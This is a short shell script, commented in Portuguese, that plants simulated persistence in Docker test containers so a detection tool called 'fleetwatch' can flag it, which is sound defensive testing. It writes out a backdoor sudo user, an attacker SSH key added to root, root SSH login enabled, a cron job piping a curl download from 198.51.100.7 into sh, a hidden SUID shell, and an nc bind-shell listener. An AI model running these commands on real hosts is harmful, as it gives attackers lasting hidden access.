#!/bin/sh
# Simula técnicas comuns de persistência para o fleetwatch detectar.
# pdv-01 fica intacto; pdv-02 e pdv-03 são "comprometidos".
set -eu
cd "$(dirname "$0")"

run() { docker compose exec -T "$1" sh -c "$2"; }

echo "[pdv-02] T1136 · cria usuário de backdoor no grupo sudo"
run pdv-02 'useradd -m -s /bin/bash -G sudo svc-backup'

echo "[pdv-02] T1098.004 · adiciona chave SSH do atacante ao root"
run pdv-02 'mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJkfHSBEq35oAiCBFrMQFbQBK1g/N9w37CDb6AZbIo0M attacker@kali" >> /root/.ssh/authorized_keys'

echo "[pdv-02] T1556 · libera login de root no sshd_config"
run pdv-02 "sed -i 's/^PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config"

echo "[pdv-03] T1053.003 · agenda cron de persistência"
run pdv-03 'echo "*/5 * * * * root curl -s http://198.51.100.7/x | sh" > /etc/cron.d/sys-update'

echo "[pdv-03] T1548.001 · deixa uma cópia SUID do shell escondida"
run pdv-03 'mkdir -p /var/tmp/.cache && cp /bin/bash /var/tmp/.cache/.sh && chmod 4755 /var/tmp/.cache/.sh'

echo "[pdv-03] T1571 · abre um listener na porta 4444 (bind shell)"
docker compose exec -d pdv-03 nc -lk 4444

echo "Pronto. Rode 'make scan' para ver os desvios."
